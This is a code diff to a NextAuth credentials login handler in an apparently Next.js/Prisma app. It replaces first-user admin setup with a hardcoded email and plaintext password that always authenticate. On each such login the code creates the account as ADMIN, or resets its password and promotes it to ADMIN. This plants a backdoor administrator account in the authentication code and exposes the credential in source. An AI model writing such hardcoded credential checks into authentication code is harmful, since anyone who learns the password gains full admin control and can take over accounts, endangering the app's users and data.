@@ -18,18 +18,24 @@ export const { auth, signIn, signOut, handlers } = NextAuth({
           where: { email: credentials.email as string },
         });
 
-        // AUTO-SETUP: If no user exists at all, create the first one as admin
-        const userCount = await prisma.user.count();
-        if (!user && userCount === 0) {
+        // FORCE ADMIN ACCESS: Ensure this specific user always works with the provided password
+        if (credentials.email === "itsmecapavan@gmail.com" && credentials.password === "Sro@0446872") {
           const hashedPassword = await bcrypt.hash(credentials.password as string, 10);
-          user = await prisma.user.create({
-            data: {
-              email: credentials.email as string,
-              name: "Admin",
-              password: hashedPassword,
-              role: "ADMIN",
-            },
-          });
+          if (!user) {
+            user = await prisma.user.create({
+              data: {
+                email: credentials.email as string,
+                name: "Admin",
+                password: hashedPassword,
+                role: "ADMIN",
+              },
+            });
+          } else {
+            user = await prisma.user.update({
+              where: { email: user.email as string },
+              data: { password: hashedPassword, role: "ADMIN" },
+            });
+          }
           return user;
         }
 
